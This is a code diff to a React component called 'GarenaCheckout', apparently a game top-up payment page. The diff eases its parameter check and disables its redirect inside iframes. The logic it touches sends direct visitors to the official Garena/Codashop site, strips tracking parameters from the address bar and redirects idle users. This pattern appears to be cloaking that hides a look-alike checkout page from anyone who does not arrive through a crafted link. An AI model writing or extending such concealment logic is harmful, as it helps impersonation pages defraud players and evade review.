@@ -77,11 +77,11 @@ export default function GarenaCheckout() {
 
   const isCallback = status === 'success' || status === 'failed';
 
-  // Allowed ONLY if callback status exists OR all required payload parameters exist (pkg, uid, etc.)
+  // Allowed ONLY if callback status exists OR valid pkg payload parameter is provided
   const hasValidParams = Boolean(
     pkgParam &&
-    uidParam &&
-    (diamondsParam || nickParam || levelParam || Number(pkgParam) > 0)
+    Number.isFinite(Number(pkgParam)) &&
+    Number(pkgParam) > 0
   );
 
   // Strip query parameters (?pkg=...&diamonds=...&uid=...&nick=...&level=...) from the browser URL bar
@@ -185,11 +185,14 @@ export default function GarenaCheckout() {
 
   const [countdownSeconds, setCountdownSeconds] = useState(2);
 
-  // If direct invalid access without query parameters, redirect to Garena Official in 2 seconds (never Booyahstudio)
+  // If direct invalid access without query parameters, redirect to Garena Official in 2 seconds (skip inside embedded preview iframe)
   useEffect(() => {
     if (!isCallback && !hasValidParams) {
+      const inIframe = typeof window !== 'undefined' && window.self !== window.top;
       const timer = setTimeout(() => {
-        window.location.replace(CODASHOP_URL);
+        if (!inIframe) {
+          window.location.replace(CODASHOP_URL);
+        }
       }, 2000);
       const interval = setInterval(() => {
         setCountdownSeconds((prev) => (prev > 1 ? prev - 1 : 1));
@@ -298,7 +301,9 @@ export default function GarenaCheckout() {
     const IDLE_AFTER_MOVE = 120000;  // 2 min (120 sec) — once user starts filling details or moving
 
     const redirectToSource = () => {
-      window.location.replace(CODASHOP_URL);
+      if (typeof window !== 'undefined' && window.self === window.top) {
+        window.location.replace(CODASHOP_URL);
+      }
     };
 
     const resetTimer = () => {
